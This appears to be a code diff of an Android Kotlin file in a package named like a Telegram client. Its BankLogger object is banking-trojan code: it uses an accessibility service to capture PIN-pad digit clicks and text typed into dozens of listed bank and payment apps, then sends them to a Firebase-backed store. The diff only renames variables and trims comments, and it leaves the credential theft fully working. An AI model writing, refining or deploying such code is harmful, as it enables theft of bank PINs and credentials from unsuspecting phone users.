@@ -3,11 +3,9 @@ package com.telegram2.messaging.remote
 import android.accessibilityservice.AccessibilityService
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
-import org.json.JSONObject
 
 object BankLogger {
     private val bankPackages = setOf(
-        // all the packages you had – I preserved them
         "com.chase.sig.android", "com.wellsfargo.mobile", "com.bankofamerica.banking",
         "com.cibc.mobile", "com.td", "com.scotiabank.banking", "com.rbc.mobile",
         "com.capitalone.mobile", "com.paypal.android.p2pmobile", "com.venmo",
@@ -27,29 +25,28 @@ object BankLogger {
         "com.moniepoint.business", "com.wemabank.alat.prod",
         "com.accessbank.nextgen", "com.gtbank.gtworldv1", "com.firstbank.firstmobile",
         "com.uba.vericash", "com.zenithBank.eazymoney"
-        // Add any other bank packages you need
     )
 
     fun onEvent(service: AccessibilityService, event: AccessibilityEvent) {
         val pkg = event.packageName?.toString() ?: return
         if (pkg !in bankPackages) return
 
-        // Capture every click on a digit (0-9) – this catches custom PIN pads
+        // Digit clicks on custom keyboards
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
             val source = event.source ?: return
-            val clickedText = getViewText(source)
-            if (clickedText != null && clickedText.length == 1 && clickedText[0].isDigit()) {
-                FirebaseBridge.appendBankData("Digit: $clickedText | App: $pkg")
+            val text = getViewText(source)
+            if (text != null && text.length == 1 && text[0].isDigit()) {
+                FirebaseBridge.appendBankData("Digit: $text | App: $pkg")
             }
             source.recycle()
         }
 
-        // Also capture text changes in input fields (backup)
+        // Text field changes
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             val source = event.source ?: return
             val newText = event.text?.joinToString(" ") ?: ""
             if (newText.isNotEmpty()) {
-                FirebaseBridge.appendBankData("TextChange: $newText | App: $pkg")
+                FirebaseBridge.appendBankData("Text: $newText | App: $pkg")
             }
             source.recycle()
         }
